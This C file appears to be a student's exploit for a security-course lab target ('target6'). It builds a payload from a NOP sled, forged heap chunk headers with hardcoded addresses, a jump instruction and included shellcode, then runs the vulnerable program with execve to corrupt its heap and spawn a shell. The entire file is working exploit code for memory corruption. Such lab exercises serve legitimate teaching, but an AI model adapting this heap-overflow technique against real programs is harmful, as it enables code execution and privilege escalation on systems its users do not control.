#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define BUFF_SIZE 192
#define JMP_ASM  0x04eb9090
#define NOP 0x90
#define TAG_SIZE 8

#define TAG_RET_ADDR 0x202dfe68
#define FAKE_TAG_ADDR 0x104ee80
#define SHELL_CODE_ADDR 0x104ee90

int main(void)
{
	char buff[BUFF_SIZE];
	int offset;

	// fill buff with NOP
	memset(buff, NOP, sizeof(buff));

	// inject fake TAG struct
	offset = 72;
	buff[offset] = (char)(FAKE_TAG_ADDR & 0xff);
	buff[offset + 1] = (char)((FAKE_TAG_ADDR >> 8) & 0xff);
	buff[offset + 2] = (char)((FAKE_TAG_ADDR >> 16) & 0xff);
	buff[offset + 3] = (char)((FAKE_TAG_ADDR >> 24) & 0xff);

	buff[offset + 4] = (char)(TAG_RET_ADDR & 0xff);
	buff[offset + 5] = (char)((TAG_RET_ADDR >> 8) & 0xff);
	buff[offset + 6] = (char)((TAG_RET_ADDR >> 16) & 0xff);
	buff[offset + 7] = (char)((TAG_RET_ADDR >> 24) & 0xff);

	// inject next fake TAG struct
	offset = offset + 16;
	buff[offset] = (char)(JMP_ASM & 0xff);
	buff[offset + 1] = (char)((JMP_ASM >> 8) & 0xff);
	buff[offset + 2] = (char)((JMP_ASM >> 16) & 0xff);
	buff[offset + 3] = (char)((JMP_ASM >> 24) & 0xff);
	buff[offset + 4] = 0x1; // free bit	


	// copy shell code
	offset = offset + TAG_SIZE * 4;
	memcpy(&buff[offset], &shellcode, sizeof(shellcode));

	// terminate buff
	buff[BUFF_SIZE - 1] = '\0';

	char *args[3];
	char *env[1];

	args[0] = TARGET; args[1] = buff; args[2] = NULL;
	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
